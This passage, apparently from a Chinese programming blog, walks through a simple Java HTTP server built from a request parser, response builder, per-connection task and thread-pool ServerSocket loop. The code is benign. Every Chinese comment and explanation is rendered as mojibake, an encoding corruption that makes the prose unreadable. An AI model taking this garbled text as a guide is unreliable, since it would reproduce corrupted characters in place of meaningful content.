è¯·æ±‚æ•°æ®è§£æä¸ºä¸€ä¸ª Request å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reqStream  åŒ…å« HTTP è¯·æ±‚æ•°æ®çš„è¾“å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>           ä¸€ä¸ªè¡¨ç¤º HTTP è¯·æ±‚çš„ Request å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException å½“å‘ç”Ÿ I/O é”™è¯¯æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Request <span class="title function_">parse2request</span><span class="params">(InputStream reqStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ BufferedReader å’Œ InputStreamReader è¯»å–è¾“å…¥æµä¸­çš„æ•°æ®</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">httpReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(reqStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ Request å¯¹è±¡</span></span><br><span class="line">    <span class="type">Request</span> <span class="variable">httpRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¯·æ±‚è¡Œå¹¶è®¾ç½®åˆ° Request å¯¹è±¡ä¸­</span></span><br><span class="line">    decodeRequestLine(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¯·æ±‚å¤´å¹¶è®¾ç½®åˆ° Request å¯¹è±¡ä¸­</span></span><br><span class="line">    decodeRequestHeader(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£ææ¶ˆæ¯æ­£æ–‡å¹¶è®¾ç½®åˆ° Request å¯¹è±¡ä¸­</span></span><br><span class="line">    decodeRequestMessage(httpReader, httpRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›è§£æåçš„ Request å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">return</span> httpRequest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæ˜¯è¯·æ±‚ç»“æœçš„å°è£…ï¼Œç»™ä¸€ä¸ªç®€å•çš„è¿›è¡Œæ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Response ç±»è¡¨ç¤ºä¸€ä¸ª HTTP å“åº”ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬ã€çŠ¶æ€ç ã€çŠ¶æ€ä¿¡æ¯ã€å“åº”å¤´å’Œå“åº”æ­£æ–‡ã€‚</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String status;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; headers;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ ¹æ®ç»™å®šçš„ Request å¯¹è±¡å’Œå“åº”å­—ç¬¦ä¸²æ„å»ºä¸€ä¸ª HTTP å“åº”ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request   ç”¨äºæ„å»ºå“åº”çš„ Request å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response  å“åº”å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>          ä¸€ä¸ªè¡¨ç¤º HTTP å“åº”çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">buildResponse</span><span class="params">(Request request, String response)</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ Response å¯¹è±¡ï¼Œå¹¶è®¾ç½®ç‰ˆæœ¬ã€çŠ¶æ€ç å’ŒçŠ¶æ€ä¿¡æ¯</span></span><br><span class="line">    <span class="type">Response</span> <span class="variable">httpResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    httpResponse.setCode(<span class="number">200</span>);</span><br><span class="line">    httpResponse.setStatus(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    httpResponse.setVersion(request.getVersion());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å“åº”å¤´</span></span><br><span class="line">    Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    headers.put(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    headers.put(<span class="string">&quot;Content-Length&quot;</span>, String.valueOf(response.getBytes().length));</span><br><span class="line">    httpResponse.setHeaders(headers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å“åº”æ­£æ–‡</span></span><br><span class="line">    httpResponse.setMessage(response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„å»ºå“åº”å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    buildResponseLine(httpResponse, builder);</span><br><span class="line">    buildResponseHeaders(httpResponse, builder);</span><br><span class="line">    buildResponseMessage(httpResponse, builder);</span><br><span class="line">    <span class="keyword">return</span> builder.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ„å»ºå“åº”è¡Œï¼ŒåŒ…æ‹¬ç‰ˆæœ¬ã€çŠ¶æ€ç å’ŒçŠ¶æ€ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      ç”¨äºæ„å»ºå“åº”è¡Œçš„ Response å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder ç”¨äºæ‹¼æ¥å“åº”å­—ç¬¦ä¸²çš„ StringBuilder å¯¹è±¡</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseLine</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    stringBuilder.append(response.getVersion()).append(<span class="string">&quot; &quot;</span>).append(response.getCode()).append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            .append(response.getStatus()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ„å»ºå“åº”å¤´ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      ç”¨äºæ„å»ºå“åº”å¤´çš„ Response å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder ç”¨äºæ‹¼æ¥å“åº”å­—ç¬¦ä¸²çš„ StringBuilder å¯¹è±¡</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseHeaders</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : response.getHeaders().entrySet()) &#123;</span><br><span class="line">        stringBuilder.append(entry.getKey()).append(<span class="string">&quot;:&quot;</span>).append(entry.getValue()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stringBuilder.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ„å»ºå“åº”æ­£æ–‡ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> response      ç”¨äºæ„å»ºå“åº”æ­£æ–‡çš„ Response å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> stringBuilder ç”¨äºæ‹¼æ¥å“åº”å­—ç¬¦ä¸²çš„ StringBuilder å¯¹è±¡</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildResponseMessage</span><span class="params">(Response response, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line">    stringBuilder.append(response.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="b-è¯·æ±‚ä»»åŠ¡-HttpTask"><a href="#b-è¯·æ±‚ä»»åŠ¡-HttpTask" class="headerlink" title="b. è¯·æ±‚ä»»åŠ¡ HttpTask"></a>b. è¯·æ±‚ä»»åŠ¡ HttpTask</h4><p>æ¯ä¸ªè¯·æ±‚ï¼Œå•ç‹¬åˆ†é…ä¸€ä¸ªä»»åŠ¡æ¥å¹²è¿™ä¸ªäº‹æƒ…ï¼Œå°±æ˜¯ä¸ºäº†æ”¯æŒå¹¶å‘ï¼Œå¯¹äº ServerSocket è€Œè¨€ï¼Œæ¥æ”¶åˆ°äº†ä¸€ä¸ªè¯·æ±‚ï¼Œé‚£å°±åˆ›å»ºä¸€ä¸ª HttpTask ä»»åŠ¡æ¥å®ç° HTTP é€šä¿¡ã€‚<br>é‚£ä¹ˆè¿™ä¸ª httptask å¹²å•¥å‘¢ï¼Ÿ</p><ul><li>ä»è¯·æ±‚ä¸­ææ•°æ®</li><li>å“åº”è¯·æ±‚</li><li>å°è£…ç»“æœå¹¶è¿”å›</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HttpTask ç±»å®ç°äº† Runnable æ¥å£ï¼Œç”¨äºå¤„ç†ä¸€ä¸ª HTTP è¯·æ±‚ã€‚</span></span><br><span class="line"><span class="comment"> * å½“åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œæ—¶ï¼Œè¯¥ä»»åŠ¡å°†å¤„ç†ä¸€ä¸ª Socket è¿æ¥ä¸Šçš„ HTTP è¯·æ±‚ï¼Œ</span></span><br><span class="line"><span class="comment"> * å¹¶å‘é€å“åº”æ¶ˆæ¯ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpTask</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="comment">// ç”¨äºå¤„ç† HTTP è¯·æ±‚çš„ Socket</span></span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„é€ ä¸€ä¸ªæ–°çš„ HttpTaskï¼Œç”¨äºå¤„ç†æŒ‡å®šçš„ Socket è¿æ¥ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> socket  ç”¨äºå¤„ç† HTTP è¯·æ±‚çš„ Socket</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpTask</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å®ç° Runnable æ¥å£çš„ run æ–¹æ³•ï¼Œç”¨äºå¤„ç† HTTP è¯·æ±‚å¹¶å‘é€å“åº”æ¶ˆæ¯ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥ socket æ˜¯å¦ä¸º nullï¼Œå¦‚æœä¸º null åˆ™æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span> (socket == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;socket can&#x27;t be null.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è·å– Socket çš„è¾“å‡ºæµï¼Œå¹¶åˆ›å»ºä¸€ä¸ª PrintWriter å¯¹è±¡</span></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(outputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä» Socket çš„è¾“å…¥æµä¸­è§£æ HTTP è¯·æ±‚</span></span><br><span class="line">            HttpMessageParser.<span class="type">Request</span> <span class="variable">httpRequest</span> <span class="operator">=</span> HttpMessageParser.parse2request(socket.getInputStream());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// æ ¹æ®è¯·æ±‚ç»“æœè¿›è¡Œå“åº”ï¼Œçœç•¥è¿”å›</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// æ ¹æ®è¯·æ±‚å’Œç»“æœæ„å»º HTTP å“åº”</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">httpRes</span> <span class="operator">=</span> HttpMessageParser.buildResponse(httpRequest, result);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// å°† HTTP å“åº”å‘é€åˆ°å®¢æˆ·ç«¯</span></span><br><span class="line">                out.print(httpRes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œæ„å»ºä¸€ä¸ªåŒ…å«å¼‚å¸¸ä¿¡æ¯çš„ HTTP å“åº”</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">httpRes</span> <span class="operator">=</span> HttpMessageParser.buildResponse(httpRequest, e.toString());</span><br><span class="line">                out.print(httpRes);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ·æ–°è¾“å‡ºæµï¼Œç¡®ä¿å“åº”æ¶ˆæ¯è¢«å‘é€</span></span><br><span class="line">            out.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// å…³é—­ Socket è¿æ¥</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="c-HTTP-æœåŠ¡æ­å»º"><a href="#c-HTTP-æœåŠ¡æ­å»º" class="headerlink" title="c. HTTP æœåŠ¡æ­å»º"></a>c. HTTP æœåŠ¡æ­å»º</h4><p>å‰é¢çš„åŸºæœ¬ä¸ŠæŠŠè¯¥å¹²çš„äº‹æƒ…éƒ½å¹²äº†ï¼Œå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œåˆ›å»º<code>ServerSocket</code>ï¼Œç»‘å®šç«¯å£æ¥æ”¶è¯·æ±‚ï¼Œæˆ‘ä»¬åœ¨çº¿ç¨‹æ± ä¸­è·‘è¿™ä¸ª HTTP æœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicHttpServer</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹æ‰§è¡Œå™¨ï¼Œç”¨äºå¯åŠ¨ HTTP æœåŠ¡å™¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ExecutorService</span> <span class="variable">bootstrapExecutor</span> <span class="operator">=</span> Executors.newSingleThreadExecutor();</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ï¼Œç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ExecutorService taskExecutor;</span><br><span class="line">    <span class="comment">// è®¾ç½®æœåŠ¡å™¨ç›‘å¬çš„ç«¯å£å·</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">8999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯åŠ¨ HTTP æœåŠ¡å™¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">startHttpServer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–å¤„ç†å™¨å¯ç”¨æ ¸å¿ƒæ•°ï¼Œç”¨äºè®¾ç½®çº¿ç¨‹æ± å¤§å°</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nThreads</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–çº¿ç¨‹æ± ï¼Œè®¾ç½®çº¿ç¨‹æ± å¤§å°ï¼Œé˜Ÿåˆ—å¤§å°å’Œä¸¢å¼ƒç­–ç•¥</span></span><br><span class="line">        taskExecutor =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads, <span class="number">0L</span>, TimeUnit.MILLISECONDS, <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="number">100</span>),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.DiscardPolicy());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¾ªç¯å°è¯•å¯åŠ¨æœåŠ¡å™¨ï¼Œå¦‚æœå¯åŠ¨å¤±è´¥ï¼Œåˆ™ç­‰å¾…10ç§’åé‡è¯•</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(PORT);</span><br><span class="line">                bootstrapExecutor.submit(<span class="keyword">new</span> <span class="title class_">ServerThread</span>(serverSocket));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// é‡è¯•ï¼Œç­‰å¾… 10 ç§’</span></span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">10</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                    Thread.currentThread().interrupt();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…³é—­å¯åŠ¨æ‰§è¡Œå™¨</span></span><br><span class="line">        bootstrapExecutor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// HTTP æœåŠ¡å™¨ä¸»è¦ä»»åŠ¡ç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="comment">// ä¿å­˜ä¼ é€’ç»™æ„é€ å‡½æ•°çš„ ServerSocket å®ä¾‹</span></span><br><span class="line">        <span class="keyword">private</span> ServerSocket serverSocket;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ServerThread</span><span class="params">(ServerSocket s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">this</span>.serverSocket = s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»»åŠ¡ä¸»ä½“æ–¹æ³•</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">                    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="built_in">this</span>.serverSocket.accept();</span><br><span class="line">                    <span class="comment">// åˆ›å»ºä¸€ä¸ª HttpTask å®ä¾‹ï¼Œå°† Socket å®ä¾‹ä½œä¸ºå‚æ•°ä¼ é€’</span></span><br><span class="line">                    <span class="type">HttpTask</span> <span class="variable">eventTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpTask</span>(socket);</span><br><span class="line">                    <span class="comment">// å°† HttpTask æäº¤ç»™ taskExecutor æ‰§è¡Œ</span></span><br><span class="line">                    taskExecutor.submit(eventTask);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œç­‰å¾… 1 ç§’åç»§ç»­å°è¯•</span></span><br><span class="line">                        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                        Thread.currentThread().interrupt();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨å®ç°ã€‚ä»¥ä¸‹æ˜¯å…³äºè¿™ä¸ª HTTP æœåŠ¡å™¨çš„ä¸»è¦ç»„ä»¶å’ŒåŠŸèƒ½çš„è¯¦ç»†è§£é‡Šï¼š<br>1ã€bootstrapExecutorï¼šä¸€ä¸ªå•çº¿ç¨‹çš„ ExecutorServiceï¼Œç”¨äºæ‰§è¡Œ HTTP æœåŠ¡å™¨çš„å¯åŠ¨ä»»åŠ¡ã€‚<br>2ã€taskExecutorï¼šä¸€ä¸ªçº¿ç¨‹æ± ï¼Œç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚ã€‚çº¿ç¨‹æ± çš„å¤§å°ç­‰äºå¤„ç†å™¨å¯ç”¨æ ¸å¿ƒæ•°ï¼Œé˜Ÿåˆ—å¤§å°ä¸º100ï¼Œä½¿ç”¨ DiscardPolicy ä¸¢å¼ƒç­–ç•¥ã€‚<br>3ã€PORTï¼šæœåŠ¡å™¨ä¾¦å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º 8999ã€‚<br>4ã€startHttpServer() æ–¹æ³•ï¼š<br>    - a.åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ±  taskExecutor ç”¨äºå¤„ç† HTTP è¯·æ±‚ã€‚<br>    